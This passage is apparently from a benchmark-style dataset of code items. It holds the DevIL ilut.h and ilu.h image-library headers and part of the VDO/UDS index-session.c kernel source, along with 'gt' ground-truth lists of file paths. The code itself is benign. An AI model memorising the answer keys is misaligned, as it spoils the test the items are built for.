ILuint Width, ILuint Height, HDC hDC);\n\tILAPI ILboolean\tILAPIENTRY ilutWinSaveImage(ILstring FileName, HBITMAP Bitmap);\n#endif\n\n\n#ifdef ILUT_USE_DIRECTX8\n\n\tILAPI struct IDirect3DTexture8* ILAPIENTRY ilutD3D8Texture(struct IDirect3DDevice8 *Device);\n\tILAPI struct IDirect3DVolumeTexture8* ILAPIENTRY ilutD3D8VolumeTexture(struct IDirect3DDevice8 *Device);\n\tILAPI ILboolean\tILAPIENTRY ilutD3D8TexFromFile(struct IDirect3DDevice8 *Device, char *FileName, struct IDirect3DTexture8 **Texture);\n\tILAPI ILboolean\tILAPIENTRY ilutD3D8VolTexFromFile(struct IDirect3DDevice8 *Device, char *FileName, struct IDirect3DVolumeTexture8 **Texture);\n\tILAPI ILboolean\tILAPIENTRY ilutD3D8TexFromFileInMemory(struct IDirect3DDevice8 *Device, void *Lump, ILuint Size, struct IDirect3DTexture8 **Texture);\n\tILAPI ILboolean\tILAPIENTRY ilutD3D8VolTexFromFileInMemory(struct IDirect3DDevice8 *Device, void *Lump, ILuint Size, struct IDirect3DVolumeTexture8 **Texture);\n\tILAPI ILboolean\tILAPIENTRY ilutD3D8TexFromFileHandle(struct IDirect3DDevice8 *Device, ILHANDLE File, struct IDirect3DTexture8 **Texture);\n\tILAPI ILboolean\tILAPIENTRY ilutD3D8VolTexFromFileHandle(struct IDirect3DDevice8 *Device, ILHANDLE File, struct IDirect3DVolumeTexture8 **Texture);\n\n\tILAPI ILboolean ILAPIENTRY ilutD3D8TexFromResource(struct IDirect3DDevice8 *Device, HMODULE SrcModule, char *SrcResource, struct IDirect3DTexture8 **Texture);\n\tILAPI ILboolean ILAPIENTRY ilutD3D8VolTexFromResource(struct IDirect3DDevice8 *Device, HMODULE SrcModule, char *SrcResource, struct IDirect3DVolumeTexture8 **Texture);\n\tILAPI ILboolean ILAPIENTRY ilutD3D8LoadSurface(struct IDirect3DDevice8 *Device, struct IDirect3DSurface8 *Surface);\n#endif\n\n#ifdef ILUT_USE_DIRECTX9\n\t#pragma warning(push)\n\t#pragma warning(disable : 4115)\n\n\tILAPI struct IDirect3DTexture9*       ILAPIENTRY ilutD3D9Texture         (struct IDirect3DDevice9* Device);\n\tILAPI struct IDirect3DVolumeTexture9* ILAPIENTRY ilutD3D9VolumeTexture   (struct IDirect3DDevice9* Device);\n    ILAPI struct IDirect3DCubeTexture9*       ILAPIENTRY ilutD3D9CubeTexture (struct IDirect3DDevice9* Device);\n\n    ILAPI ILboolean ILAPIENTRY ilutD3D9CubeTexFromFile(struct IDirect3DDevice9 *Device, ILconst_string FileName, struct IDirect3DCubeTexture9 **Texture);\n    ILAPI ILboolean ILAPIENTRY ilutD3D9CubeTexFromFileInMemory(struct IDirect3DDevice9 *Device, void *Lump, ILuint Size, struct IDirect3DCubeTexture9 **Texture);\n    ILAPI ILboolean ILAPIENTRY ilutD3D9CubeTexFromFileHandle(struct IDirect3DDevice9 *Device, ILHANDLE File, struct IDirect3DCubeTexture9 **Texture);\n    ILAPI ILboolean ILAPIENTRY ilutD3D9CubeTexFromResource(struct IDirect3DDevice9 *Device, HMODULE SrcModule, ILconst_string SrcResource, struct IDirect3DCubeTexture9 **Texture);\n\n\tILAPI ILboolean\tILAPIENTRY ilutD3D9TexFromFile(struct IDirect3DDevice9 *Device, ILconst_string FileName, struct IDirect3DTexture9 **Texture);\n\tILAPI ILboolean\tILAPIENTRY ilutD3D9VolTexFromFile(struct IDirect3DDevice9 *Device, ILconst_string FileName, struct IDirect3DVolumeTexture9 **Texture);\n\tILAPI ILboolean\tILAPIENTRY ilutD3D9TexFromFileInMemory(struct IDirect3DDevice9 *Device, void *Lump, ILuint Size, struct IDirect3DTexture9 **Texture);\n\tILAPI ILboolean\tILAPIENTRY ilutD3D9VolTexFromFileInMemory(struct IDirect3DDevice9 *Device, void *Lump, ILuint Size, struct IDirect3DVolumeTexture9 **Texture);\n\tILAPI ILboolean\tILAPIENTRY ilutD3D9TexFromFileHandle(struct IDirect3DDevice9 *Device, ILHANDLE File, struct IDirect3DTexture9 **Texture);\n\tILAPI ILboolean\tILAPIENTRY ilutD3D9VolTexFromFileHandle(struct IDirect3DDevice9 *Device, ILHANDLE File, struct IDirect3DVolumeTexture9 **Texture);\n\n\n\tILAPI ILboolean ILAPIENTRY ilutD3D9TexFromResource(struct IDirect3DDevice9 *Device, HMODULE SrcModule, ILconst_string SrcResource, struct IDirect3DTexture9 **Texture);\n\tILAPI ILboolean ILAPIENTRY ilutD3D9VolTexFromResource(struct IDirect3DDevice9 *Device, HMODULE SrcModule, ILconst_string SrcResource, struct IDirect3DVolumeTexture9 **Texture);\n\tILAPI ILboolean ILAPIENTRY ilutD3D9LoadSurface(struct IDirect3DDevice9 *Device, struct IDirect3DSurface9 *Surface);\n\t#pragma warning(pop)\n#endif\n\n#ifdef ILUT_USE_DIRECTX10\n\tILAPI ID3D10Texture2D* ILAPIENTRY ilutD3D10Texture(ID3D10Device *Device);\n\tILAPI ILboolean ILAPIENTRY ilutD3D10TexFromFile(ID3D10Device *Device, ILconst_string FileName, ID3D10Texture2D **Texture);\n\tILAPI ILboolean ILAPIENTRY ilutD3D10TexFromFileInMemory(ID3D10Device *Device, void *Lump, ILuint Size, ID3D10Texture2D **Texture);\n\tILAPI ILboolean ILAPIENTRY ilutD3D10TexFromResource(ID3D10Device *Device, HMODULE SrcModule, ILconst_string SrcResource, ID3D10Texture2D **Texture);\n\tILAPI ILboolean ILAPIENTRY ilutD3D10TexFromFileHandle(ID3D10Device *Device, ILHANDLE File, ID3D10Texture2D **Texture);\n#endif\n\n\n\n#ifdef ILUT_USE_X11\n\tILAPI XImage * ILAPIENTRY ilutXCreateImage( Display* );\n\tILAPI Pixmap ILAPIENTRY ilutXCreatePixmap( Display*,Drawable );\n\tILAPI XImage * ILAPIENTRY ilutXLoadImage( Display*,char* );\n\tILAPI Pixmap ILAPIENTRY ilutXLoadPixmap( Display*,Drawable,char* );\n#ifdef ILUT_USE_XSHM\n\tILAPI XImage * ILAPIENTRY ilutXShmCreateImage( Display*,XShmSegmentInfo* );\n\tILAPI void ILAPIENTRY ilutXShmDestroyImage( Display*,XImage*,XShmSegmentInfo* );\n\tILAPI Pixmap ILAPIENTRY ilutXShmCreatePixmap( Display*,Drawable,XShmSegmentInfo* );\n\tILAPI void ILAPIENTRY ilutXShmFreePixmap( Display*,Pixmap,XShmSegmentInfo* );\n\tILAPI XImage * ILAPIENTRY ilutXShmLoadImage( Display*,char*,XShmSegmentInfo* );\n\tILAPI Pixmap ILAPIENTRY ilutXShmLoadPixmap( Display*,Drawable,char*,XShmSegmentInfo* );\n#endif\n#endif\n\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n#endif\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/IL/ilu.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef __ilu_h_\n#ifndef __ILU_H__\n\n#define __ilu_h_\n#define __ILU_H__\n\n#include <IL/il.h>\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n#ifdef _WIN32\n\t#if (defined(IL_USE_PRAGMA_LIBS)) && (!defined(_IL_BUILD_LIBRARY))\n\t\t#if defined(_MSC_VER) || defined(__BORLANDC__)\n\t\t\t#pragma comment(lib, \"ILU.lib\")\n\t\t#endif\n\t#endif\n#endif\n\n\n#define ILU_VERSION_1_8_0 1\n#define ILU_VERSION       180\n\n\n#define ILU_FILTER         0x2600\n#define ILU_NEAREST        0x2601\n#define ILU_LINEAR         0x2602\n#define ILU_BILINEAR       0x2603\n#define ILU_SCALE_BOX      0x2604\n#define ILU_SCALE_TRIANGLE 0x2605\n#define ILU_SCALE_BELL     0x2606\n#define ILU_SCALE_BSPLINE  0x2607\n#define ILU_SCALE_LANCZOS3 0x2608\n#define ILU_SCALE_MITCHELL 0x2609\n\n\n\n#define ILU_INVALID_ENUM      0x0501\n#define ILU_OUT_OF_MEMORY     0x0502\n#define ILU_INTERNAL_ERROR    0x0504\n#define ILU_INVALID_VALUE     0x0505\n#define ILU_ILLEGAL_OPERATION 0x0506\n#define ILU_INVALID_PARAM     0x0509\n\n\n\n#define ILU_PLACEMENT          0x0700\n#define ILU_LOWER_LEFT         0x0701\n#define ILU_LOWER_RIGHT        0x0702\n#define ILU_UPPER_LEFT         0x0703\n#define ILU_UPPER_RIGHT        0x0704\n#define ILU_CENTER             0x0705\n#define ILU_CONVOLUTION_MATRIX 0x0710\n\n#define ILU_VERSION_NUM IL_VERSION_NUM\n#define ILU_VENDOR      IL_VENDOR\n\n\n\n#define ILU_ENGLISH            0x0800\n#define ILU_ARABIC             0x0801\n#define ILU_DUTCH              0x0802\n#define ILU_JAPANESE           0x0803\n#define ILU_SPANISH            0x0804\n#define ILU_GERMAN             0x0805\n#define ILU_FRENCH             0x0806\n#define ILU_ITALIAN            0x0807\n\n\n\n\n\n\ntypedef struct ILinfo\n{\n\tILuint  Id;\n\tILubyte *Data;\n\tILuint  Width;\n\tILuint  Height;\n\tILuint  Depth;\n\tILubyte Bpp;\n\tILuint  SizeOfData;\n\tILenum  Format;\n\tILenum  Type;\n\tILenum  Origin;\n\tILubyte *Palette;\n\tILenum  PalType;\n\tILuint  PalSize;\n\tILenum  CubeFlags;\n\tILuint  NumNext;\n\tILuint  NumMips;\n\tILuint  NumLayers;\n} ILinfo;\n\n\ntypedef struct ILpointf {\n\tILfloat x;\n\tILfloat y;\n} ILpointf;\n\ntypedef struct ILpointi {\n\tILint x;\n\tILint y;\n} ILpointi;\n\nILAPI ILboolean      ILAPIENTRY iluAlienify(void);\nILAPI ILboolean      ILAPIENTRY iluBlurAvg(ILuint Iter);\nILAPI ILboolean      ILAPIENTRY iluBlurGaussian(ILuint Iter);\nILAPI ILboolean      ILAPIENTRY iluBuildMipmaps(void);\nILAPI ILuint         ILAPIENTRY iluColoursUsed(void);\nILAPI ILboolean      ILAPIENTRY iluCompareImage(ILuint Comp);\nILAPI ILboolean      ILAPIENTRY iluContrast(ILfloat Contrast);\nILAPI ILboolean      ILAPIENTRY iluCrop(ILuint XOff, ILuint YOff, ILuint ZOff, ILuint Width, ILuint Height, ILuint Depth);\nILAPI void           ILAPIENTRY iluDeleteImage(ILuint Id);\nILAPI ILboolean      ILAPIENTRY iluEdgeDetectE(void);\nILAPI ILboolean      ILAPIENTRY iluEdgeDetectP(void);\nILAPI ILboolean      ILAPIENTRY iluEdgeDetectS(void);\nILAPI ILboolean      ILAPIENTRY iluEmboss(void);\nILAPI ILboolean      ILAPIENTRY iluEnlargeCanvas(ILuint Width, ILuint Height, ILuint Depth);\nILAPI ILboolean      ILAPIENTRY iluEnlargeImage(ILfloat XDim, ILfloat YDim, ILfloat ZDim);\nILAPI ILboolean      ILAPIENTRY iluEqualize(void);\nILAPI ILboolean      ILAPIENTRY iluEqualize2(void);\nILAPI ILconst_string \t\t ILAPIENTRY iluErrorString(ILenum Error);\nILAPI ILboolean      ILAPIENTRY iluConvolution(ILint *matrix, ILint scale, ILint bias);\nILAPI ILboolean      ILAPIENTRY iluFlipImage(void);\nILAPI ILboolean      ILAPIENTRY iluGammaCorrect(ILfloat Gamma);\nILAPI ILuint         ILAPIENTRY iluGenImage(void);\nILAPI void           ILAPIENTRY iluGetImageInfo(ILinfo *Info);\nILAPI ILint          ILAPIENTRY iluGetInteger(ILenum Mode);\nILAPI void           ILAPIENTRY iluGetIntegerv(ILenum Mode, ILint *Param);\nILAPI ILstring \t\t ILAPIENTRY iluGetString(ILenum StringName);\nILAPI void           ILAPIENTRY iluImageParameter(ILenum PName, ILenum Param);\nILAPI void           ILAPIENTRY iluInit(void);\nILAPI ILboolean      ILAPIENTRY iluInvertAlpha(void);\nILAPI ILuint         ILAPIENTRY iluLoadImage(ILconst_string FileName);\nILAPI ILboolean      ILAPIENTRY iluMirror(void);\nILAPI ILboolean      ILAPIENTRY iluNegative(void);\nILAPI ILboolean      ILAPIENTRY iluNoisify(ILclampf Tolerance);\nILAPI ILboolean      ILAPIENTRY iluPixelize(ILuint PixSize);\nILAPI void           ILAPIENTRY iluRegionfv(ILpointf *Points, ILuint n);\nILAPI void           ILAPIENTRY iluRegioniv(ILpointi *Points, ILuint n);\nILAPI ILboolean      ILAPIENTRY iluReplaceColour(ILubyte Red, ILubyte Green, ILubyte Blue, ILfloat Tolerance);\nILAPI ILboolean      ILAPIENTRY iluRotate(ILfloat Angle);\nILAPI ILboolean      ILAPIENTRY iluRotate3D(ILfloat x, ILfloat y, ILfloat z, ILfloat Angle);\nILAPI ILboolean      ILAPIENTRY iluSaturate1f(ILfloat Saturation);\nILAPI ILboolean      ILAPIENTRY iluSaturate4f(ILfloat r, ILfloat g, ILfloat b, ILfloat Saturation);\nILAPI ILboolean      ILAPIENTRY iluScale(ILuint Width, ILuint Height, ILuint Depth);\nILAPI ILboolean      ILAPIENTRY iluScaleAlpha(ILfloat scale);\nILAPI ILboolean      ILAPIENTRY iluScaleColours(ILfloat r, ILfloat g, ILfloat b);\nILAPI ILboolean      ILAPIENTRY iluSepia(void);\nILAPI ILboolean      ILAPIENTRY iluSetLanguage(ILenum Language);\nILAPI ILboolean      ILAPIENTRY iluSharpen(ILfloat Factor, ILuint Iter);\nILAPI ILboolean      ILAPIENTRY iluSwapColours(void);\nILAPI ILboolean      ILAPIENTRY iluWave(ILfloat Angle);\n\n#define iluColorsUsed   iluColoursUsed\n#define iluSwapColors   iluSwapColours\n#define iluReplaceColor iluReplaceColour\n#define iluScaleColor   iluScaleColour\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n#endif\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/IL/ilu.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/IL/ilut.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/IL/il_wrap.h'"
        ]
    },
    {
        "files": [
            "'vdo/utils/uds/index-session.c'",
            "'vdo/utils/uds/linux/dm-bufio.h'",
            "'vdo/utils/uds/index-layout.h'",
            "'vdo/utils/uds/io-factory.h'"
        ],
        "content": "'vdo/utils/uds/index-session.c'\n:\n\n\n#include \"index-session.h\"\n\n#include <linux/atomic.h>\n\n#include \"logger.h\"\n#include \"memory-alloc.h\"\n#include \"time-utils.h\"\n\n#include \"funnel-requestqueue.h\"\n#include \"index.h\"\n#include \"index-layout.h\"\n\n\n\nenum index_session_flag_bit {\n\tIS_FLAG_BIT_START = 8,\n\n\tIS_FLAG_BIT_LOADING = IS_FLAG_BIT_START,\n\n\tIS_FLAG_BIT_LOADED,\n\n\tIS_FLAG_BIT_DISABLED,\n\n\tIS_FLAG_BIT_SUSPENDED,\n\n\tIS_FLAG_BIT_WAITING,\n\n\tIS_FLAG_BIT_CLOSING,\n\n\tIS_FLAG_BIT_DESTROYING,\n};\n\nenum index_session_flag {\n\tIS_FLAG_LOADED = (1 << IS_FLAG_BIT_LOADED),\n\tIS_FLAG_LOADING = (1 << IS_FLAG_BIT_LOADING),\n\tIS_FLAG_DISABLED = (1 << IS_FLAG_BIT_DISABLED),\n\tIS_FLAG_SUSPENDED = (1 << IS_FLAG_BIT_SUSPENDED),\n\tIS_FLAG_WAITING = (1 << IS_FLAG_BIT_WAITING),\n\tIS_FLAG_CLOSING = (1 << IS_FLAG_BIT_CLOSING),\n\tIS_FLAG_DESTROYING = (1 << IS_FLAG_BIT_DESTROYING),\n};\n\n\nstatic void release_index_session(struct uds_index_session *index_session)\n{\n\tmutex_lock(&index_session->request_mutex);\n\tif (--index_session->request_count == 0)\n\t\tuds_broadcast_cond(&index_session->request_cond);\n\tmutex_unlock(&index_session->request_mutex);\n}\n\n\nstatic int get_index_session(struct uds_index_session *index_session)\n{\n\tunsigned int state;\n\tint result = UDS_SUCCESS;\n\n\tmutex_lock(&index_session->request_mutex);\n\tindex_session->request_count++;\n\tstate = index_session->state;\n\tmutex_unlock(&index_session->request_mutex);\n\n\tif (state == IS_FLAG_LOADED) {\n\t\treturn UDS_SUCCESS;\n\t} else if (state & IS_FLAG_DISABLED) {\n\t\tresult = UDS_DISABLED;\n\t} else if ((state & IS_FLAG_LOADING) ||\n\t\t   (state & IS_FLAG_SUSPENDED) ||\n\t\t   (state & IS_FLAG_WAITING)) {\n\t\tresult = -EBUSY;\n\t} else {\n\t\tresult = UDS_NO_INDEX;\n\t}\n\n\trelease_index_session(index_session);\n\treturn result;\n}\n\nint uds_launch_request(struct uds_request *request)\n{\n\tsize_t internal_size;\n\tint result;\n\n\tif (request->callback == NULL) {\n\t\tvdo_log_error(\"missing required callback\");\n\t\treturn -EINVAL;\n\t}\n\n\tswitch (request->type) {\n\tcase UDS_DELETE:\n\tcase UDS_POST:\n\tcase UDS_QUERY:\n\tcase UDS_QUERY_NO_UPDATE:\n\tcase UDS_UPDATE:\n\t\tbreak;\n\tdefault:\n\t\tvdo_log_error(\"received invalid callback type\");\n\t\treturn -EINVAL;\n\t}\n\n\n\tinternal_size =\n\t\tsizeof(struct uds_request) - offsetof(struct uds_request, zone_number);\n\n\tmemset((char *) request + sizeof(*request) - internal_size, 0, internal_size);\n\n\tresult = get_index_session(request->session);\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\trequest->found = false;\n\trequest->unbatched = false;\n\trequest->index = request->session->index;\n\n\tuds_enqueue_request(request, STAGE_TRIAGE);\n\treturn UDS_SUCCESS;\n}\n\nstatic void enter_callback_stage(struct uds_request *request)\n{\n\tif (request->status != UDS_SUCCESS) {\n\n\t\tmutex_lock(&request->session->request_mutex);\n\t\trequest->session->state |= IS_FLAG_DISABLED;\n\t\tmutex_unlock(&request->session->request_mutex);\n\t}\n\n\tuds_request_queue_enqueue(request->session->callback_queue, request);\n}\n\nstatic inline void count_once(u64 *count_ptr)\n{\n\tWRITE_ONCE(*count_ptr, READ_ONCE(*count_ptr) + 1);\n}\n\nstatic void update_session_stats(struct uds_request *request)\n{\n\tstruct session_stats *session_stats = &request->session->stats;\n\n\tcount_once(&session_stats->requests);\n\n\tswitch (request->type) {\n\tcase UDS_POST:\n\t\tif (request->found)\n\t\t\tcount_once(&session_stats->posts_found);\n\t\telse\n\t\t\tcount_once(&session_stats->posts_not_found);\n\n\t\tif (request->location == UDS_LOCATION_IN_OPEN_CHAPTER)\n\t\t\tcount_once(&session_stats->posts_found_open_chapter);\n\t\telse if (request->location == UDS_LOCATION_IN_DENSE)\n\t\t\tcount_once(&session_stats->posts_found_dense);\n\t\telse if (request->location == UDS_LOCATION_IN_SPARSE)\n\t\t\tcount_once(&session_stats->posts_found_sparse);\n\t\tbreak;\n\n\tcase UDS_UPDATE:\n\t\tif (request->found)\n\t\t\tcount_once(&session_stats->updates_found);\n\t\telse\n\t\t\tcount_once(&session_stats->updates_not_found);\n\t\tbreak;\n\n\tcase UDS_DELETE:\n\t\tif (request->found)\n\t\t\tcount_once(&session_stats->deletions_found);\n\t\telse\n\t\t\tcount_once(&session_stats->deletions_not_found);\n\t\tbreak;\n\n\tcase UDS_QUERY:\n\tcase UDS_QUERY_NO_UPDATE:\n\t\tif (request->found)\n\t\t\tcount_once(&session_stats->queries_found);\n\t\telse\n\t\t\tcount_once(&session_stats->queries_not_found);\n\t\tbreak;\n\n\tdefault:\n\t\trequest->status = VDO_ASSERT(false, \"unknown request type: %d\",\n\t\t\t\t\t     request->type);\n\t}\n}\n\nstatic void handle_callbacks(struct uds_request *request)\n{\n\tstruct uds_index_session *index_session = request->session;\n\n\tif (request->status == UDS_SUCCESS)\n\t\tupdate_session_stats(request);\n\n\trequest->status = uds_status_to_errno(request->status);\n\trequest->callback(request);\n\trelease_index_session(index_session);\n}\n\nstatic int __must_check make_empty_index_session(struct uds_index_session **index_session_ptr)\n{\n\tint result;\n\tstruct uds_index_session *session;\n\n\tresult = vdo_allocate(1, struct uds_index_session, __func__, &session);\n\tif (result != VDO_SUCCESS)\n\t\treturn result;\n\n\tmutex_init(&session->request_mutex);\n\tuds_init_cond(&session->request_cond);\n\tmutex_init(&session->load_context.mutex);\n\tuds_init_cond(&session->load_context.cond);\n\n\tresult = uds_make_request_queue(\"callbackW\", &handle_callbacks,\n\t\t\t\t\t&session->callback_queue);\n\tif (result != UDS_SUCCESS) {\n\t\tuds_destroy_cond(&session->load_context.cond);\n\t\tmutex_destroy(&session->load_context.mutex);\n\t\tuds_destroy_cond(&session->request_cond);\n\t\tmutex_destroy(&session->request_mutex);\n\t\tvdo_free(session);\n\t\treturn result;\n\t}\n\n\t*index_session_ptr = session;\n\treturn UDS_SUCCESS;\n}\n\nint uds_create_index_session(struct uds_index_session **session)\n{\n\tif (session == NULL) {\n\t\tvdo_log_error(\"missing session pointer\");\n\t\treturn -EINVAL;\n\t}\n\n\treturn uds_status_to_errno(make_empty_index_session(session));\n}\n\nstatic int __must_check start_loading_index_session(struct uds_index_session *index_session)\n{\n\tint result;\n\n\tmutex_lock(&index_session->request_mutex);\n\tif (index_session->state & IS_FLAG_SUSPENDED) {\n\t\tvdo_log_info(\"Index session is suspended\");\n\t\tresult = -EBUSY;\n\t} else if (index_session->state != 0) {\n\t\tvdo_log_info(\"Index is already loaded\");\n\t\tresult = -EBUSY;\n\t} else {\n\t\tindex_session->state |= IS_FLAG_LOADING;\n\t\tresult = UDS_SUCCESS;\n\t}\n\tmutex_unlock(&index_session->request_mutex);\n\treturn result;\n}\n\nstatic void finish_loading_index_session(struct uds_index_session *index_session,\n\t\t\t\t\t int result)\n{\n\tmutex_lock(&index_session->request_mutex);\n\tindex_session->state &= ~IS_FLAG_LOADING;\n\tif (result == UDS_SUCCESS)\n\t\tindex_session->state |= IS_FLAG_LOADED;\n\n\tuds_broadcast_cond(&index_session->request_cond);\n\tmutex_unlock(&index_session->request_mutex);\n}\n\nstatic int initialize_index_session(struct uds_index_session *index_session,\n\t\t\t\t    enum uds_open_index_type open_type)\n{\n\tint result;\n\tstruct uds_configuration *config;\n\n\tresult = uds_make_configuration(&index_session->parameters, &config);\n\tif (result != UDS_SUCCESS) {\n\t\tvdo_log_error_strerror(result, \"Failed to allocate config\");\n\t\treturn result;\n\t}\n\n\tmemset(&index_session->stats, 0, sizeof(index_session->stats));\n\tresult = uds_make_index(config, open_type, &index_session->load_context,\n\t\t\t\tenter_callback_stage, &index_session->index);\n\tif (result != UDS_SUCCESS)\n\t\tvdo_log_error_strerror(result, \"Failed to make index\");\n\telse\n\t\tuds_log_configuration(config);\n\n\tuds_free_configuration(config);\n\treturn result;\n}\n\nstatic const char *get_open_type_string(enum uds_open_index_type open_type)\n{\n\tswitch (open_type) {\n\tcase UDS_CREATE:\n\t\treturn \"creating index\";\n\tcase UDS_LOAD:\n\t\treturn \"loading or rebuilding index\";\n\tcase UDS_NO_REBUILD:\n\t\treturn \"loading index\";\n\tdefault:\n\t\treturn \"unknown open method\";\n\t}\n}\n\n\nint uds_open_index(enum uds_open_index_type open_type,\n\t\t   const struct uds_parameters *parameters,\n\t\t   struct uds_index_session *session)\n{\n\tint result;\n\tchar name[BDEVNAME_SIZE];\n\n\tif (parameters == NULL) {\n\t\tvdo_log_error(\"missing required parameters\");\n\t\treturn -EINVAL;\n\t}\n\tif (parameters->bdev == NULL) {\n\t\tvdo_log_error(\"missing required block device\");\n\t\treturn -EINVAL;\n\t}\n\tif (session == NULL) {\n\t\tvdo_log_error(\"missing required session pointer\");\n\t\treturn -EINVAL;\n\t}\n\n\tresult = start_loading_index_session(session);\n\tif (result != UDS_SUCCESS)\n\t\treturn uds_status_to_errno(result);\n\n\tsession->parameters = *parameters;\n\tformat_dev_t(name, parameters->bdev->bd_dev);\n\tvdo_log_info(\"%s: %s\", get_open_type_string(open_type), name);\n\n\tresult = initialize_index_session(session, open_type);\n\tif (result != UDS_SUCCESS)\n\t\tvdo_log_error_strerror(result, \"Failed %s\",\n\t\t\t\t       get_open_type_string(open_type));\n\n\tfinish_loading_index_session(session, result);\n\treturn uds_status_to_errno(result);\n}\n\nstatic void wait_for_no_requests_in_progress(struct uds_index_session *index_session)\n{\n\tmutex_lock(&index_session->request_mutex);\n\twhile (index_session->request_count > 0) {\n\t\tuds_wait_cond(&index_session->request_cond,\n\t\t\t      &index_session->request_mutex);\n\t}\n\tmutex_unlock(&index_session->request_mutex);\n}\n\nstatic int __must_check save_index(struct uds_index_session *index_session)\n{\n\twait_for_no_requests_in_progress(index_session);\n\treturn uds_save_index(index_session->index);\n}\n\nstatic void suspend_rebuild(struct uds_index_session *session)\n{\n\tmutex_lock(&session->load_context.mutex);\n\tswitch (session->load_context.status) {\n\tcase INDEX_OPENING:\n\t\tsession->load_context.status = INDEX_SUSPENDING;\n\n\n\t\twhile ((session->load_context.status != INDEX_SUSPENDED) &&\n\t\t       (session->load_context.status != INDEX_READY)) {\n\t\t\tuds_wait_cond(&session->load_context.cond,\n\t\t\t\t      &session->load_context.mutex);\n\t\t}\n\n\t\tbreak;\n\n\tcase INDEX_READY:\n\n\t\tbreak;\n\n\tcase INDEX_SUSPENDED:\n\tcase INDEX_SUSPENDING:\n\tcase INDEX_FREEING:\n\tdefault:\n\n\t\tVDO_ASSERT_LOG_ONLY(false, \"Bad load context state %u\",\n\t\t\t\t    session->load_context.status);\n\t\tbreak;\n\t}\n\tmutex_unlock(&session->load_context.mutex);\n}\n\n\nint uds_suspend_index_session(struct uds_index_session *session, bool save)\n{\n\tint result = UDS_SUCCESS;\n\tbool no_work = false;\n\tbool rebuilding = false;\n\n\n\tmutex_lock(&session->request_mutex);\n\twhile (session->state & IS_FLAG_CLOSING)\n\t\tuds_wait_cond(&session->request_cond, &session->request_mutex);\n\n\tif ((session->state & IS_FLAG_WAITING) || (session->state & IS_FLAG_DESTROYING)) {\n\t\tno_work = true;\n\t\tvdo_log_info(\"Index session is already changing state\");\n\t\tresult = -EBUSY;\n\t} else if (session->state & IS_FLAG_SUSPENDED) {\n\t\tno_work = true;\n\t} else if (session->state & IS_FLAG_LOADING) {\n\t\tsession->state |= IS_FLAG_WAITING;\n\t\trebuilding = true;\n\t} else if (session->state & IS_FLAG_LOADED) {\n\t\tsession->state |= IS_FLAG_WAITING;\n\t} else {\n\t\tno_work = true;\n\t\tsession->state |= IS_FLAG_SUSPENDED;\n\t\tuds_broadcast_cond(&session->request_cond);\n\t}\n\tmutex_unlock(&session->request_mutex);\n\n\tif (no_work)\n\t\treturn uds_status_to_errno(result);\n\n\tif (rebuilding)\n\t\tsuspend_rebuild(session);\n\telse if (save)\n\t\tresult = save_index(session);\n\telse\n\t\tresult = uds_flush_index_session(session);\n\n\tmutex_lock(&session->request_mutex);\n\tsession->state &= ~IS_FLAG_WAITING;\n\tsession->state |= IS_FLAG_SUSPENDED;\n\tuds_broadcast_cond(&session->request_cond);\n\tmutex_unlock(&session->request_mutex);\n\treturn uds_status_to_errno(result);\n}\n\nstatic int replace_device(struct uds_index_session *session, struct block_device *bdev)\n{\n\tint result;\n\n\tresult = uds_replace_index_storage(session->index, bdev);\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\tsession->parameters.bdev = bdev;\n\treturn UDS_SUCCESS;\n}\n\n\nint uds_resume_index_session(struct uds_index_session *session,\n\t\t\t     struct block_device *bdev)\n{\n\tint result = UDS_SUCCESS;\n\tbool no_work = false;\n\tbool resume_replay = false;\n\n\tmutex_lock(&session->request_mutex);\n\tif (session->state & IS_FLAG_WAITING) {\n\t\tvdo_log_info(\"Index session is already changing state\");\n\t\tno_work = true;\n\t\tresult = -EBUSY;\n\t} else if (!(session->state & IS_FLAG_SUSPENDED)) {\n\n\t\tno_work = true;\n\t\tresult = UDS_SUCCESS;\n\t} else {\n\t\tsession->state |= IS_FLAG_WAITING;\n\t\tif (session->state & IS_FLAG_LOADING)\n\t\t\tresume_replay = true;\n\t}\n\tmutex_unlock(&session->request_mutex);\n\n\tif (no_work)\n\t\treturn result;\n\n\tif ((session->index != NULL) && (bdev != session->parameters.bdev)) {\n\t\tresult = replace_device(session, bdev);\n\t\tif (result != UDS_SUCCESS) {\n\t\t\tmutex_lock(&session->request_mutex);\n\t\t\tsession->state &= ~IS_FLAG_WAITING;\n\t\t\tuds_broadcast_cond(&session->request_cond);\n\t\t\tmutex_unlock(&session->request_mutex);\n\t\t\treturn uds_status_to_errno(result);\n\t\t}\n\t}\n\n\tif (resume_replay) {\n\t\tmutex_lock(&session->load_context.mutex);\n\t\tswitch (session->load_context.status) {\n\t\tcase INDEX_SUSPENDED:\n\t\t\tsession->load_context.status = INDEX_OPENING;\n\n\t\t\tuds_broadcast_cond(&session->load_context.cond);\n\t\t\tbreak;\n\n\t\tcase INDEX_READY:\n\n\t\t\tbreak;\n\n\t\tcase INDEX_OPENING:\n\t\tcase INDEX_SUSPENDING:\n\t\tcase INDEX_FREEING:\n\t\tdefault:\n\n\t\t\tVDO_ASSERT_LOG_ONLY(false, \"Bad load context state %u\",\n\t\t\t\t\t    session->load_context.status);\n\t\t\tbreak;\n\t\t}\n\t\tmutex_unlock(&session->load_context.mutex);\n\t}\n\n\tmutex_lock(&session->request_mutex);\n\tsession->state &= ~IS_FLAG_WAITING;\n\tsession->state &= ~IS_FLAG_SUSPENDED;\n\tuds_broadcast_cond(&session->request_cond);\n\tmutex_unlock(&session->request_mutex);\n\treturn UDS_SUCCESS;\n}\n\nstatic int save_and_free_index(struct uds_index_session *index_session)\n{\n\tint result = UDS_SUCCESS;\n\tbool suspended;\n\tstruct uds_index *index = index_session->index;\n\n\tif (index == NULL)\n\t\treturn UDS_SUCCESS;\n\n\tmutex_lock(&index_session->request_mutex);\n\tsuspended = (index_session->state & 